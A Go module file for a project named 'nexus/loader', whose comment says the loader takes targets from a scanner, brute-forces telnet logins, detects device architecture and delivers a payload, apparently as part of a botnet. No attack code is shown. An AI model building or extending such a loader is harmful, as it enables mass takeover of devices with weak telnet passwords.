module nexus/loader

go 1.21

// Zero external dependencies — pure Go standard library.
// The loader receives targets from scanListen via stdin,
// brute-forces telnet, detects architecture, and delivers the payload.
